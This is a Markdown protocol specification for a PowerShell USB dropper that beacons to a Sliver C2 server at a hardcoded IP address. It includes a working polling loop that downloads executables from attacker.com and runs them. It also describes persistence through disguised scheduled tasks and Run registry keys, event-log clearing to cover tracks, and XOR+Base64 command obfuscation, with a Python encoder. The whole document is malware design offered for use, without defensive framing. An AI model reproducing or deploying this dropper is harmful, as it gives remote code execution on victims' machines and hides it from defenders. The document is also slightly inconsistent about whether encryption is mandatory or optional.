# C2 Server Contracts - Client ↔ Sliver

**Client:** USB Dropper (Windows PowerShell)  
**Server:** Sliver C2 (HTTP Listener)

---

## Endpoints

### 1. Health Check

**Endpoint:** `GET /health`

**Purpose:** Verify C2 is online and reachable

**Request:**
```
GET http://104.131.164.51:8080/health HTTP/1.1
Host: 104.131.164.51:8080
Timeout: 3 seconds
```

**Response:**
```
HTTP/1.1 200 OK
Content-Type: text/plain

[any content, dropper ignores]
```

**Client behavior:**
- Called once at startup (IsReachable check)
- If fails: dropper exits (no persistence)
- If succeeds: proceed to polling loop

---

### 2. Command Poll

**Endpoint:** `GET /command?host=<HOSTNAME>`

**Purpose:** Fetch command from C2 for execution

**Request:**
```
GET http://104.131.164.51:8080/command?host=DESKTOP-ABC123 HTTP/1.1
Host: 104.131.164.51:8080
Timeout: 5 seconds
```

**Parameters:**
- `host` (query string): Target hostname for logging/tracking

**Response (plaintext):**
```
HTTP/1.1 200 OK
Content-Type: text/plain

[RESPONSE_BODY]
```

**Response formats accepted:**

#### A. Empty response (no command)
```
""
```
Dropper: Wait, poll again in 5-60 seconds

#### B. DELETE command
```
DELETE
```
Dropper: Exit immediately, trigger cleanup

#### C. HTTP URL (payload download)
```
http://attacker.com/payload.exe
```
Dropper: 
1. Download from URL to `$env:TEMP\[random].exe`
2. Execute: `& $tmp.exe`
3. Delete temp file

#### D. PowerShell command (future)
```
powershell -Command "Get-Process"
```
Dropper: Not yet implemented (stub for extensibility)

---

## Polling Loop

**Client behavior:**

```powershell
$url = "http://104.131.164.51:8080"
$hostname = "DESKTOP-ABC123"
$backoff = 5  # seconds

while ($true) {
  Start-Sleep -Seconds $backoff
  
  try {
    $cmd = Invoke-WebRequest "$url/command?host=$hostname" -TimeoutSec 5
    
    if ($cmd.Content) {
      $backoff = 5  # Reset backoff on success
      
      if ($cmd.Content.Trim() -eq 'DELETE') {
        exit  # Cleanup happens on exit
      }
      
      if ($cmd.Content -like 'http*') {
        $tmp = "$env:TEMP\$(Get-Random).exe"
        Invoke-WebRequest $cmd.Content -OutFile $tmp -TimeoutSec 10
        & $tmp
        Remove-Item $tmp -Force
      }
    }
  } catch {
    $backoff = [Math]::Min($backoff * 2, 60)  # Exponential backoff (cap 60s)
  }
}
```

**Timing:**
- Initial jitter: 5-60 seconds between polls
- On success: reset to 5s backoff
- On error: exponential backoff (5→10→20→40→60s cap)

---

## Encryption (ACTIVE)

**Method:** XOR + Base64 (now mandatory)

**Key:** `stealth-key-123` (hardcoded)

**Server → Client (encoding):**
```
plaintext command
           ↓
        UTF8 bytes
           ↓
        XOR with key (cycling)
           ↓
        Base64 encode
           ↓
        HTTP response body
```

**Client → Server (decoding):**
```
HTTP response body
           ↓
        Base64 decode
           ↓
        XOR with key (cycling)
           ↓
        UTF8 string
           ↓
        Execute (DELETE, http://, etc)
```

**Key rotation:** Hardcoded for now; future: negotiate on first handshake

**All responses encrypted:** /command endpoint responses must be base64(XOR(plaintext, key))

---

## Cleanup (DELETE)

**Triggered by:** Server sends "DELETE" response

**Client cleanup:**
```powershell
exit  # Process exits

# Scheduled task cleanup (handled separately):
schtasks /delete /tn "WindowsTask_[hash]" /f

# Registry cleanup (handled separately):
Remove-ItemProperty HKCU:\Software\Microsoft\Windows\CurrentVersion\Run -Name "WindowsUpdate_[hash]"

# Event logs:
Clear-EventLog -LogName "Windows PowerShell"
```

---

## Request/Response Headers

**All requests use:**
- `User-Agent: Invoke-WebRequest`
- `Content-Type: text/plain`
- `Timeout: 5 seconds`
- `ErrorAction: SilentlyContinue` (no error output)

**Server can ignore:**
- Client doesn't send authentication headers
- No custom headers required
- Standard HTTP/1.1

---

## Payload Delivery

**Flow:**
```
Client: GET /command?host=DESKTOP-ABC123
         ↓
Server: HTTP 200 OK
        Body: "http://attacker.com/payload.exe"
         ↓
Client: Download from URL
        Save to $env:TEMP\[random].exe
        Execute
        Delete
```

**Requirements:**
- Server must be able to host/redirect to payload URL
- Payload must be executable (.exe)
- Payload runs with client's privileges (user)

---

## Hostname Parameter

**Purpose:** Identify unique targets

**Format:** `DESKTOP-[random]` (Windows default) or custom

**Client source:**
```powershell
[System.Net.Dns]::GetHostName()
```

**Server use:**
- Track multiple targets
- Send target-specific payloads
- Maintain command queue per target

---

## Status Codes

| Code | Meaning | Client Action |
|------|---------|---------------|
| 200 | Success | Parse body |
| 404 | Not found | Treat as empty (retry) |
| 5xx | Server error | Exponential backoff |
| Timeout | No response | Exponential backoff |

---

## Example Exchange

### Scenario 1: Empty response

```
CLIENT:  GET /command?host=DESKTOP-ABC123
SERVER:  HTTP 200 OK
         Content-Length: 0
         
CLIENT:  Wait 5-60 seconds, retry
```

### Scenario 2: Payload delivery (encrypted)

```
CLIENT:  GET /command?host=DESKTOP-ABC123
SERVER:  HTTP 200 OK
         Content-Type: text/plain
         
         aGHQ3Jk8mNp2XqRtYvWxZaBcDeFgHiJk=  (base64)
         
         [decoded: http://attacker.com/shell.exe]
         
CLIENT:  Base64 decode → XOR decrypt → "http://attacker.com/shell.exe"
         Download shell.exe → $env:TEMP\12345.exe
         Execute → & $env:TEMP\12345.exe
         Delete $env:TEMP\12345.exe
         Retry poll
```

### Scenario 3: Cleanup

```
CLIENT:  GET /command?host=DESKTOP-ABC123
SERVER:  HTTP 200 OK
         
         DELETE
         
CLIENT:  exit
         (scheduled task removed)
         (registry key removed)
         (logs cleared)
```

---

## Implementation Notes

**For Sliver (or Custom C2):**

1. **Listen** on configurable port (default 8080)
2. **Serve `/health`** endpoint
   - Any 200 OK response
   - Body ignored
3. **Serve `/command?host=HOSTNAME`** endpoint
   - Query param: `host` (target identifier)
   - Response: base64(XOR(plaintext, "stealth-key-123"))
   - Content-Type: text/plain
4. **Support empty responses** (no command)
   - Empty body = retry later
5. **Support DELETE command**
   - Response body: "DELETE" (plaintext or encrypted)
6. **Support payload URLs**
   - Response body: "http://attacker.com/payload.exe" (plaintext or encrypted)

**Encryption requirement:**
- ALL `/command` responses MUST be encrypted
- Encrypt using: base64(XOR_encrypt(plaintext, key))
- Key: `stealth-key-123`

**Example encryption (Python):**
```python
def xor_encrypt(plaintext, key):
    key_bytes = key.encode()
    plain_bytes = plaintext.encode()
    cipher = bytes(plain_bytes[i] ^ key_bytes[i % len(key_bytes)] 
                   for i in range(len(plain_bytes)))
    return base64.b64encode(cipher).decode()

# Usage:
encrypted = xor_encrypt("DELETE", "stealth-key-123")
# Send as HTTP response body
```

**For Custom C2:**
- Implement same endpoints
- Same response format (ENCRYPTED)
- Same DELETE handling
- Optional: support other response types

---

**Last Updated:** 2026-10-13  
**Protocol Version:** 1.0  
**Encryption:** Optional (XOR+Base64, hardcoded key)
